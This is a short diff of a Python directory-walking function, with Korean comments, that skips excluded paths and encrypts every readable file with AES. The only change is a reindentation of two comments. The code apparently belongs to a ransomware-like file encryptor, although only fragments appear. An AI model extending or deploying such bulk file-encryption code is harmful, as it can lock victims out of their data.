@@ -77,7 +77,7 @@ def search(dirname):
         if changePath in path:
             dontTouch = True
 
-				# 위의 필터링 과정을 모두 통과했다면 암호화 진행
+	# 위의 필터링 과정을 모두 통과했다면 암호화 진행
         if not dontTouch:
 
             for filename in files:
@@ -100,7 +100,7 @@ def search(dirname):
                 except:
                     fileWriteError = True
 
-								# 파일을 여는 과정에서 에러가 발생하지 않았다면 암호화 진행
+		# 파일을 여는 과정에서 에러가 발생하지 않았다면 암호화 진행
                 if not (fileReadError or fileWriteError or filePermissionError):
                     # 암호화 진행 #
                     ciphertext, tag = encryptAES(data)
